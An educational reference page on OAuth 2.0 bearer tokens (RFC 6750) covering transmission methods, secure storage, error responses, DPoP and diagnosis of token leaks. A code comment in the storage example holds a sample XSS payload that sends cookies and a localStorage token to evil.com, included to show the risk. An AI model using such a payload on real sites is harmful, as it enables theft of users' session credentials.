---
id: OAU-015
title: "Bearer Token"
category: OAuth 2.0 & OpenID Connect
tier: tier-2-networking-security
folder: OAU-oauth
difficulty: ★☆☆
depends_on: OAU-008
used_by: OAU-016, OAU-023, OAU-041
related: OAU-008, OAU-023, OAU-041
tags:
  - security
  - oauth
  - tokens
  - http
  - foundational
status: complete
version: 5
layout: default
parent: "OAuth 2.0 & OpenID Connect"
grand_parent: "Technical Mastery"
nav_order: 15
permalink: /technical-mastery/oauth/bearer-token/
---

⚡ TL;DR - A bearer token is an access token where possession
equals authorization: any party that holds the token can use it.
RFC 6750 specifies how bearer tokens are transmitted via HTTP -
the `Authorization: Bearer <token>` header is the standard. Bearer
tokens must travel over HTTPS only, be stored securely, and be
short-lived, because unlike username/password credentials, anyone
who intercepts a bearer token can use it immediately without any
other proof. The "bearer" in the name means "whoever holds this."

---

### 🔥 The Problem This Solves

**WORLD WITHOUT IT:**

Before bearer tokens, API authentication required request signing
(OAuth 1.0's HMAC-SHA1 approach): each request was individually
signed with a timestamp, nonce, and the token secret. This made
the token useless to a man-in-the-middle who intercepted just
the token string - they needed the signing secret too. However,
this came at severe implementation cost: a multi-step signing
algorithm that developers consistently implemented incorrectly,
library compatibility nightmares, and no way to just "include the
token and call the API."

**THE BREAKING POINT:**

OAuth 1.0's per-request signing protected against token theft on
non-TLS connections - a legitimate concern in 2007 when TLS
deployment was sparse and expensive. By 2011, TLS had become
ubiquitous and free. The security argument for per-request signing
evaporated: if you assume TLS, the token in transit is already
protected. The signing ceremony no longer purchased security;
it only purchased implementation complexity.

**THE INVENTION MOMENT:**

Bearer tokens are the simplification that TLS ubiquity enables.
If TLS protects tokens in transit, the only risk is token theft
from storage or compromise of the token endpoint. These risks are
addressed by short TTL and HTTPS-only transmission. The bearer
semantics ("whoever holds this token may use it") is a deliberate
simplification: it makes API calls trivially simple to implement
in exchange for requiring secure transmission and storage.

**EVOLUTION:**

RFC 6750 (2012) formalized bearer token transmission. Bearer is
now the de facto standard for OAuth 2.0. DPoP (RFC 9449, 2023)
is the modern evolution that adds sender-binding back to OAuth 2.0
tokens: a DPoP-bound token is only usable by the party that holds
the corresponding private key, providing the security of OAuth 1.0
signing without the implementation complexity - critical for high-
security environments where bearer token theft is a real risk.

---

### 📘 Textbook Definition

A bearer token (RFC 6750) is a security token with the property
that any party in possession of the token (a "bearer") can use
it to access resources associated with the token. Bearer tokens
are an access token type in the OAuth 2.0 framework. RFC 6750
specifies three methods of sending bearer tokens: the Authorization
request header field (RECOMMENDED), the form-encoded body parameter
(acceptable for specific situations), and the URI query parameter
(NOT RECOMMENDED). Bearer tokens must be protected in transit
using TLS (HTTPS) and must be stored securely on both client
and server sides. The "bearer" semantics contrast with "proof
of possession" (PoP) token semantics, where the token is bound
to a specific key and requires cryptographic proof of possession.

---

### ⏱️ Understand It in 30 Seconds

**One line:**
A bearer token is "whoever holds this may use it" - send it in
the `Authorization: Bearer <token>` header over HTTPS and the
API trusts you.

**One analogy:**

> A bearer token is like cash money. Cash has bearer semantics:
> whoever holds it can spend it. You don't need to prove the
> cash is "yours" - possession is the proof. If your wallet is
> stolen, the thief can spend your cash. The security model for
> cash is: protect it while you have it, keep amounts small (short
> TTL = small transaction window), and require TLS (a locked wallet
> = HTTPS). The alternative (OAuth 1.0 signing) is like a signed
> cheque: the merchant must verify the signature before accepting.
> Cheques are more secure if stolen but far more complex to process.

**One insight:**
The bearer model creates a simple security invariant: protecting
a bearer token IS authorization. There is no separate "is this
the right owner?" check - possession IS proof. This means: token
security depends entirely on transmission security (HTTPS) and
storage security. A token that leaks to an attacker is
indistinguishable from a token legitimately used by the app.

---

### 🔩 First Principles Explanation

**CORE INVARIANTS:**

1. Bearer tokens are transported via HTTPS only. There is no
   security model for bearer tokens over HTTP - the transmission
   layer is the only protection.

2. Bearer tokens are short-lived. The possession-equals-
   authorization model means the blast radius of a stolen token
   is bounded by its TTL.

3. Bearer tokens must be stored securely. A token in a log file,
   URL, or localStorage is effectively leaked.

**DERIVED DESIGN:**

The three transmission methods in RFC 6750 exist for different
transport constraints. The Authorization header is preferred
because it is not logged by web servers or CDNs (unlike URLs),
is not stored in browser history (unlike URL query params), and
is not included in Referer headers (unlike URL params). Form body
is a fallback for clients that cannot set headers. URI query
parameter is the last resort and is explicitly discouraged because
tokens in URLs are logged everywhere.

---

### 🧠 Mental Model / Analogy

> Bearer tokens are the OAuth equivalent of a hotel room key card.
> The key card grants room access to whoever holds it - no identity
> check, no signature, just "does this card work?" If you lose
> your key card, whoever finds it can open your room until the
> card is deactivated or expires. The hotel's defense model:
> short expiry, keep the card in your pocket (secure storage),
> and the hotel locks all the doors (HTTPS = the locked corridor).

---

### 📶 Gradual Depth - Five Levels

**Level 1 - What it is (anyone can understand):**
A bearer token is a string you put in the `Authorization` header
of API requests. The word "bearer" just means "whoever sends this
gets access." Include it in the header as
`Authorization: Bearer <your_token>` over HTTPS.

**Level 2 - How to use it (junior developer):**
Always include bearer tokens in the `Authorization: Bearer`
header - never in the URL or query string. Always use HTTPS.
Never log requests that include Authorization headers. Never
store tokens in localStorage. Set short TTL (15 minutes is
common). Use refresh tokens to get new access tokens when the
bearer token expires.

**Level 3 - How it works (mid-level engineer):**
When the Resource Server receives a request with
`Authorization: Bearer <token>`, it extracts the token, validates
it (JWT: local signature + claims check; opaque: introspection),
checks scope, and returns the response. The "bearer" label in the
Authorization header is the scheme identifier that tells the
server this is an OAuth 2.0 bearer token (as opposed to Basic
auth, Digest, etc.). The scheme is registered in the IANA
Authorization Schemes registry. Multiple authorization schemes
can be active simultaneously on different endpoints.

**Level 4 - Why it was designed this way (senior/staff):**
RFC 6750 defines three transmission methods because real-world
clients have constraints. Some JavaScript XMLHttpRequest
environments could not set the Authorization header (cross-origin
restrictions before CORS). Form POST with body parameter was the
workaround. URI query parameter exists for legacy API designs that
predate the bearer token standard. The preference order (header
> body > URI) is explicitly security-motivated: tokens in headers
are not logged by standard web infrastructure; tokens in URIs are.
This is not just HTTP convention - it is a security architectural
decision about which attack surface to minimize.

**Level 5 - Mastery (distinguished engineer):**
The fundamental limitation of bearer tokens is token substitution
attacks and stolen-in-transit abuse. DPoP (Demonstration of Proof
of Possession, RFC 9449) addresses this by requiring the client
to prove it holds the private key corresponding to the public key
bound to the token. A DPoP-bound token is presented alongside a
DPoP proof (a JWT signed by the client's private key). The
Resource Server validates both: the token (standard validation)
and the DPoP proof (that this specific client holds the key).
A stolen DPoP token is useless without the private key. DPoP
restores sender-binding (OAuth 1.0's core security property)
without per-request HMAC signing. This is the production-mature
pattern for high-security APIs that must resist stolen-token
abuse even on TLS-secured connections.

---

### ⚙️ How It Works (Mechanism)

**Three transmission methods (RFC 6750):**

```
┌───────────────────────────────────────────────────────┐
│     Bearer Token Transmission Methods (RFC 6750)      │
├───────────────────────────────────────────────────────┤
│                                                       │
│  Method 1: Authorization Header (RECOMMENDED)         │
│                                                       │
│  GET /api/resource HTTP/1.1                           │
│  Host: api.example.com                                │
│  Authorization: Bearer eyJhbGciOiJSUzI1Ni...         │
│                                                       │
│  WHY: Not in access log URL, not in Referer header,   │
│  not in browser history. Standard HTTPS header -      │
│  only visible at the transport layer.                 │
│                                                       │
│  Method 2: Form-Encoded Body (CONDITIONALLY OK)       │
│                                                       │
│  POST /api/resource HTTP/1.1                          │
│  Content-Type: application/x-www-form-urlencoded      │
│                                                       │
│  access_token=eyJhbGciOiJSUzI1Ni...&param=value      │
│                                                       │
│  USE ONLY WHEN: Client cannot set headers (legacy).   │
│  Request must be POST with form-encoded content type. │
│  Body not typically logged, but more exposed than     │
│  header.                                              │
│                                                       │
│  Method 3: URI Query Parameter (NOT RECOMMENDED)      │
│                                                       │
│  GET /api/resource?access_token=eyJhbGciOi...        │
│                                                       │
│  WHY NOT: Token appears in:                           │
│  - Server access logs (standard format logs URL)      │
│  - Browser history                                    │
│  - Referer header on external links                   │
│  - CDN/proxy logs                                     │
│  - Error reports (Sentry, Datadog capture URLs)       │
│  ONLY USE: For legacy systems with no alternative.    │
└───────────────────────────────────────────────────────┘
```

```mermaid
flowchart TD
  CLIENT[Client] --> CHOICE{Can set<br/>Authorization header?}
  CHOICE -->|Yes| HEADER["Authorization: Bearer token<br/>(RECOMMENDED)"]
  CHOICE -->|No, POST only| FORM["access_token in form body<br/>(conditional)"]
  CHOICE -->|Last resort| URI["?access_token= in URL<br/>(NOT RECOMMENDED)"]
  HEADER --> RS[Resource Server]
  FORM --> RS
  URI --> RS
  RS --> VALIDATE[Validate bearer token]
  VALIDATE --> RESPONSE[200 + resource data]
```

**How a Resource Server processes the Authorization header:**

```
Request: GET /api/contacts
         Authorization: Bearer eyJhbGciOiJSUzI1NiIs...

Resource Server processing:
  1. Extract scheme: "Bearer" (scheme)
  2. Extract token: "eyJhbGciOiJSUzI1NiIs..." (credentials)
  3. Validate token type:
     - If starts with "eyJ": likely JWT → local validation
     - If opaque string: introspection endpoint
  4. JWT validation:
     a. Decode header → algorithm (RS256), kid (key ID)
     b. Fetch/cache JWKS, find key by kid
     c. Verify signature
     d. Check exp (not expired)
     e. Check iss (trusted issuer)
     f. Check aud (this resource server)
     g. Extract scope claim
  5. Check scope for this endpoint
  6. Return 200 + resource data

Error responses (RFC 6750 §3.1):
  Token missing:
    HTTP 401
    WWW-Authenticate: Bearer realm="api.example.com"

  Token invalid/expired:
    HTTP 401
    WWW-Authenticate: Bearer error="invalid_token"

  Insufficient scope:
    HTTP 403
    WWW-Authenticate: Bearer error="insufficient_scope"
                      scope="required:scope"
```

---

### 🔄 The Complete Picture - End-to-End Flow

**BEARER TOKEN SECURITY MODEL:**

```
Security depends on three layers:

1. TRANSPORT LAYER (HTTPS):
   Bearer token in plaintext over HTTPS is safe.
   Bearer token in plaintext over HTTP → anyone who can
   intercept the TCP stream can steal and use the token.
   MANDATORY: HTTPS for all bearer token transmissions.

2. STORAGE LAYER (client side):
   In-memory (SPA): XSS risk, cleared on page close.
   HttpOnly cookie: JS cannot read, but CSRF risk exists.
   localStorage: XSS theft, persistent.
   Server session: safest for server-side apps.
   Never: localStorage, URL params, logs.

3. TOKEN LIFETIME:
   Short TTL (15-60 min): limits stolen-token window.
   If token stolen: attacker has TTL minutes of access.
   Refresh tokens extend authorization without
   extending the stolen-token window (short access,
   long session).
```

**WHAT CHANGES AT SCALE:**

At high scale, bearer token validation must be fast. JWT local
validation (no network call) is critical. Web servers and reverse
proxies must have log sanitization rules that redact Authorization
header content. At 100,000+ requests/second, a 1ms validation
overhead matters - JWKS key caching and JWT library selection
are performance-relevant architectural decisions.

---

### 💻 Code Example

**Example 1 - BAD then GOOD: Token extraction and error handling:**

```javascript
// BAD: Token in URL query parameter
// Token appears in server logs, browser history, Referer
async function fetchContacts(token) {
  const response = await fetch(
    `/api/contacts?access_token=${token}` // WRONG
  );
  return response.json();
}

// BAD: No error handling for 401/403
async function fetchContacts(token) {
  const response = await fetch('/api/contacts', {
    headers: { Authorization: `Bearer ${token}` }
  });
  // No handling for expired/invalid token
  return response.json(); // 401 returns error JSON
}
```

```javascript
// GOOD: Authorization header, full error handling
// WHY: Header not logged. 401/403 handled per RFC 6750
//   error response semantics (different recovery actions).

class BearerTokenClient {
  #token = null;
  #refreshFn;

  constructor(token, refreshFn) {
    this.#token = token;
    this.#refreshFn = refreshFn;
  }

  async request(url, options = {}) {
    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        // Standard bearer presentation
        'Authorization': `Bearer ${this.#token}`,
      }
    });

    if (response.status === 401) {
      // Token expired or invalid - check error type
      const error = await response.json().catch(() => ({}));
      if (error.error === 'invalid_token') {
        // Try refreshing once
        this.#token = await this.#refreshFn();
        if (this.#token) {
          return this.request(url, options); // retry once
        }
      }
      // Cannot recover: user must re-authorize
      throw new AuthorizationRequiredError();
    }

    if (response.status === 403) {
      // Insufficient scope - cannot recover by refreshing
      const error = await response.json().catch(() => ({}));
      throw new InsufficientScopeError(error.scope);
      // Caller must re-authorize with expanded scope
    }

    return response;
    // WHAT BREAKS: Infinite retry loop if refresh always
    //   returns expired tokens. Guard: retry ONCE only.
    // HOW TO TEST: Mock API to return 401; verify refresh
    //   is called; verify second request uses new token.
  }
}
```

**Example 2 - BAD then GOOD: Bearer token storage in SPA:**

```javascript
// BAD: Storing access token in localStorage
// Any XSS-injected script can steal this:
// <script>
//   fetch('https://evil.com?' +
//     document.cookie + localStorage.getItem('token'))
// </script>
function storeToken(token) {
  localStorage.setItem('access_token', token); // WRONG
}

// ALSO BAD: logging requests with authorization
function logRequest(url, headers) {
  console.log('Request to:', url, 'Headers:', headers);
  // Logs: { Authorization: 'Bearer eyJ...' }
  // Token in browser console log = accessible to XSS
}
```

```javascript
// GOOD: In-memory storage for access token
// Refresh token in httpOnly cookie (server manages)
// WHY: Memory cleared on page close; httpOnly cookie
//   not readable by JS (XSS-resistant); server-managed
//   refresh token never touches JS memory.

class TokenManager {
  // Private field: access token in JS memory only
  #accessToken = null;

  setAccessToken(token) {
    this.#accessToken = token;
    // NOT stored in localStorage, sessionStorage, or cookie
    // Cleared automatically when page closes
  }

  getAccessToken() {
    return this.#accessToken;
  }

  clearAccessToken() {
    this.#accessToken = null;
  }
}

// Logging: sanitize Authorization headers
function sanitizedLog(label, headers) {
  const safeHeaders = { ...headers };
  if (safeHeaders['Authorization']) {
    // Show scheme + first 8 chars only for debugging
    safeHeaders['Authorization'] =
      safeHeaders['Authorization'].replace(
        /^(Bearer\s+)(.{8}).*/,
        '$1$2...[REDACTED]'
      );
  }
  console.log(label, safeHeaders);
}
```

**Example 3 - Resource Server: exact RFC 6750 error responses:**

```java
// Resource Server: emit correct RFC 6750 error responses
// WHY: Correct error format enables client to distinguish
//   between: (1) no token (start auth), (2) expired token
//   (refresh), (3) wrong scope (re-authorize with more scope)

@Component
public class BearerTokenErrorHandler
    implements AuthenticationEntryPoint,
               AccessDeniedHandler {

  // No token presented or token is invalid/expired:
  @Override
  public void commence(HttpServletRequest request,
      HttpServletResponse response,
      AuthenticationException e) throws IOException {

    response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);

    // RFC 6750 §3: WWW-Authenticate header format
    String bearerError = e.getMessage().contains("expired")
        ? "error=\"invalid_token\","
          + " error_description=\"Token has expired\""
        : "error=\"invalid_token\"";

    response.setHeader("WWW-Authenticate",
        "Bearer realm=\"api.example.com\", " + bearerError);
    response.setContentType("application/json");
    response.getWriter().write(
        "{\"error\":\"invalid_token\","
        + "\"error_description\":\"" + e.getMessage() + "\"}"
    );
  }

  // Token valid but insufficient scope:
  @Override
  public void handle(HttpServletRequest request,
      HttpServletResponse response,
      AccessDeniedException e) throws IOException {

    response.setStatus(HttpServletResponse.SC_FORBIDDEN);

    // Include required scope in WWW-Authenticate
    String requiredScope = extractRequiredScope(request);
    response.setHeader("WWW-Authenticate",
        "Bearer realm=\"api.example.com\","
        + " error=\"insufficient_scope\","
        + " scope=\"" + requiredScope + "\"");
    response.setContentType("application/json");
    response.getWriter().write(
        "{\"error\":\"insufficient_scope\","
        + "\"scope\":\"" + requiredScope + "\"}"
    );
    // WHAT BREAKS: If required scope not set on the
    //   SecurityExpressionRoot, scope field is empty
    // HOW TO TEST: Call endpoint with valid token, wrong scope;
    //   verify 403 + WWW-Authenticate with scope
  }
}
```

---

### ⚖️ Comparison Table

| Token Scheme | Possession-based | Sender-bound | Complexity | RFC |
|---|---|---|---|---|
| **Bearer (standard)** | Yes - possession = auth | No | Low | RFC 6750 |
| **DPoP-bound** | Yes + proof required | Yes | Medium | RFC 9449 |
| **mTLS-bound** | Yes + client cert | Yes (mTLS) | High | RFC 8705 |
| **OAuth 1.0 signed** | No - signature required | Yes | Very high | RFC 5849 |

How to choose: bearer for standard APIs (simplicity + short TTL
provides acceptable security). DPoP for high-security APIs where
token theft is a significant concern (financial, healthcare).
mTLS for enterprise M2M where PKI infrastructure exists. OAuth 1.0
signing: never for new implementations.

---

### 🔁 Flow / Lifecycle

```
[Token Issued]
  Access token issued by Authorization Server
  type = "Bearer" in token response
  expires_in = 900 (15 minutes typical)

[Request Processing]
  Client: Authorization: Bearer <token>
  Resource Server: extract token from header
  Validate: signature + exp + iss + aud + scope
  Authorized: 200 + resource

[Token Expired]
  Resource Server: exp in past → 401 invalid_token
  Client: use refresh_token to get new bearer token
  Retry request with new token

[Token Revoked]
  AS: token jti marked revoked
  Resource Server (opaque): introspection → active: false
  Resource Server (JWT + no revocation list): valid until exp
  Client: 401 → refresh → if refresh fails → re-authorize
```

```mermaid
stateDiagram-v2
  [*] --> Issued: AS issues Bearer token
  Issued --> Active: Client presents token
  Active --> Active: Resource Server validates + responds
  Active --> Expired: exp claim in past
  Active --> Revoked: User revokes access
  Expired --> Refreshed: Client uses refresh_token
  Refreshed --> Active: New bearer token
  Revoked --> Expired: JWT expires naturally (without revocation list)
  Revoked --> Immediately: Opaque token - introspection active=false
```

---

### ⚠️ Common Misconceptions

| Misconception | Reality |
|---|---|
| Bearer tokens are only for OAuth 2.0 | Bearer tokens (RFC 6750) are an HTTP authorization scheme that can be used with any token-based system, not just OAuth. They appear in API keys, JWTs from non-OAuth systems, and proprietary token systems. |
| Passing the token in a query parameter is acceptable for convenience | RFC 6750 marks URI query parameter transmission as NOT RECOMMENDED for security reasons. Tokens in URLs appear in server logs, browser history, and Referer headers - effectively leaking to anyone with log access. |
| The bearer scheme means the token is unsigned or unverified | "Bearer" refers to the ACCESS semantics (possession = authorization), not to whether the token is signed. JWT bearer tokens are RS256-signed. The bearer scheme means the server does not require an additional proof of identity beyond possessing the token. |
| Storing a bearer token in localStorage is acceptable if the session is short | localStorage is persistent (survives page reload, browser close/open) and readable by any JavaScript on the page. XSS attacks can exfiltrate localStorage contents. Duration is irrelevant - the storage mechanism is the vulnerability. |

---

### 🚨 Failure Modes & Diagnosis

**Bearer Token in Server Access Log (Credential Exposure)**

**Symptom:**
Security audit finds access tokens in the web server access log
(Apache/nginx access.log format). Tokens appear when the API
client uses the URI query parameter method. Log files are stored
in unencrypted backup storage accessible to operations teams.

**Root Cause:**
API client uses `?access_token=...` (URI query parameter method
of RFC 6750 §2.3) instead of the Authorization header. Standard
web server access logs record the full request URL including query
parameters.

**Diagnostic Command / Tool:**

```bash
# Check for tokens in recent access logs:
grep -E "access_token=eyJ" /var/log/nginx/access.log | wc -l
# If > 0: tokens in logs

# Check log rotation - how long are logs retained?
ls -la /var/log/nginx/access.log.*.gz

# Search application code for query-parameter token usage:
grep -rn "access_token=" src/ --include="*.java" \
  --include="*.js" --include="*.py"
# Any result using access_token= in URL construction = vulnerable

# Also check CDN/proxy logs:
# These are often forwarded to SIEM tools where tokens persist
```

**Fix:**
Change all API clients to use the `Authorization: Bearer` header.
Implement log sanitization rules that redact Authorization header
values before writing to log files. Rotate (invalidate) all
tokens that appeared in logs.

**Prevention:**
Enforce header-based bearer token presentation at the API gateway.
Return 400 Bad Request if `access_token` query parameter is
present (discourages the pattern). Add log sanitization to the
deployment configuration checklist.

---

**Token in Browser Referer Header (Third-Party Exposure)**

**Symptom:**
Analytics or third-party scripts on the application page report
seeing `access_token` values in Referer headers from page
navigation. Investigation shows the token was in the URL.

**Root Cause:**
The application performed a page navigation to a URL containing
the bearer token (e.g., after a redirect that included the token
for legacy compatibility). When the user subsequently navigates
to an external link or loads an external resource, the browser
includes the full previous URL as the Referer header.

**Diagnostic Command / Tool:**

```bash
# Check if any redirect URL contains access_token:
# Review application redirect logic after OAuth callback:
grep -r "redirect.*access_token\|access_token.*redirect" src/

# Check browser network tab for Referer header in
# requests to third-party services (analytics, CDN):
# DevTools → Network → Select any request → Headers → Referer
# Look for URLs containing access_token=
```

**Fix:**
Remove access_token from all application URLs. Use the
Authorization header or session-based token storage. If
third-party resources must be loaded on post-auth pages,
use `Referrer-Policy: no-referrer` or `origin` to prevent
the full URL from being sent.

**Prevention:**
Add `Referrer-Policy: strict-origin-when-cross-origin` to all
HTTP responses. This prevents the token-containing URL from
being sent to external domains via the Referer header even if
a token accidentally appears in a URL.

---

### 🔗 Related Keywords

**Prerequisites (understand these first):**

- `Access Token` - bearer tokens are one type of access token;
  bearer = the transmission semantics, not the token format

**Builds On This (learn these next):**

- `Token Validation` - how the Resource Server processes the
  bearer token in the Authorization header
- `Proof of Possession Tokens - DPoP (RFC 9449)` - the modern
  alternative to bearer semantics that adds sender-binding

**Alternatives / Comparisons:**

- `mTLS Client Authentication (RFC 8705)` - certificate-bound
  tokens as an alternative to pure bearer semantics
- `DPoP (RFC 9449)` - sender-constrained bearer tokens; the
  upgrade path for high-security bearer token deployments

---

### 📌 Quick Reference Card

```
┌──────────────────────────────────────────────────────────┐
│ WHAT IT IS   │ "Whoever holds this may use it" -         │
│              │ possession equals authorization           │
├──────────────┼───────────────────────────────────────────┤
│ HTTP FORMAT  │ Authorization: Bearer <token>             │
│              │ (HTTPS only, in header - not URL)         │
├──────────────┼───────────────────────────────────────────┤
│ 3 METHODS    │ 1. Header (RECOMMENDED)                   │
│ (RFC 6750)   │ 2. Form body (conditional)                │
│              │ 3. URI query param (NOT RECOMMENDED)      │
├──────────────┼───────────────────────────────────────────┤
│ 401 RESPONSE │ Token missing or invalid/expired          │
│ 403 RESPONSE │ Valid token, insufficient scope           │
├──────────────┼───────────────────────────────────────────┤
│ SECURITY     │ HTTPS (in transit) + short TTL (blast     │
│ MODEL        │ radius) + secure storage (at rest)        │
├──────────────┼───────────────────────────────────────────┤
│ ANTI-PATTERN │ Token in URL, localStorage, or log files  │
├──────────────┼───────────────────────────────────────────┤
│ UPGRADE PATH │ DPoP (RFC 9449) for sender-binding if     │
│              │ token theft is a significant risk         │
├──────────────┼───────────────────────────────────────────┤
│ ONE-LINER    │ "Bearer = cash: protect the token,        │
│              │  HTTPS = the locked wallet"               │
├──────────────┼───────────────────────────────────────────┤
│ NEXT EXPLORE │ Token Validation → DPoP (RFC 9449)        │
└──────────────────────────────────────────────────────────┘
```

**If you remember only 3 things:**

1. Bearer = possession is proof. Anyone who holds the token can
   use it. Security depends entirely on transmission (HTTPS) and
   storage (memory/session - not localStorage/URL).

2. `Authorization: Bearer <token>` in the HTTP header is the
   one correct way to send a bearer token. Never in the URL
   query string (goes into every log).

3. 401 = token problem (expired, invalid - try refreshing).
   403 = authorization problem (wrong scope - re-authorize with
   needed scope). These require different client responses.

**Interview one-liner:**
"A bearer token is an access token with possession-equals-
authorization semantics: the Authorization header carries it,
HTTPS protects it in transit, and short TTL bounds the blast
radius if stolen. RFC 6750 defines three transmission methods
with the Authorization header strongly preferred. 401 means
token problem; 403 means scope problem - different recovery paths."

---

### 💡 The Surprising Truth

RFC 6750's decision to allow URI query parameter transmission
(Section 2.3) was motivated by real-world compatibility: in 2012,
some JavaScript environments (particularly old XMLHttpRequest
implementations) could not set the Authorization header for
cross-origin requests before CORS was widely supported. The spec
included the query parameter method as a pragmatic escape hatch.
The spec explicitly marks it NOT RECOMMENDED and notes that it
"SHOULD NOT be used" except where no other method is feasible.
Despite this, many popular API clients and documentation
examples used query parameters for convenience. It took another
decade of security research and the widespread adoption of CORS
to marginalize the pattern. The lesson: "NOT RECOMMENDED but
included for compatibility" in a specification almost always
becomes widely adopted in practice, regardless of the warning.

---

### ✅ Mastery Checklist

**You've mastered this when you can:**

1. **[EXPLAIN]** Explain the bearer token security model to a
   developer who asks "why can't I put the token in the URL
   for convenience?" - with specific examples of where URL-based
   tokens appear in infrastructure logs.

2. **[IMPLEMENT]** Configure a web server (nginx, Apache, or a
   cloud load balancer) to redact the Authorization header value
   from access logs, while still logging the request method,
   path, and response code.

3. **[CHOOSE]** A financial API team asks whether they should
   use standard bearer tokens or DPoP for their new payment
   initiation endpoint. Evaluate the threat model difference
   and make a recommendation with justification.

4. **[DEBUG]** After a security incident, audit whether any
   bearer tokens appeared in: (a) web server access logs,
   (b) application debug logs, (c) error monitoring tools,
   (d) browser local storage. Describe the grep patterns and
   tools for each.
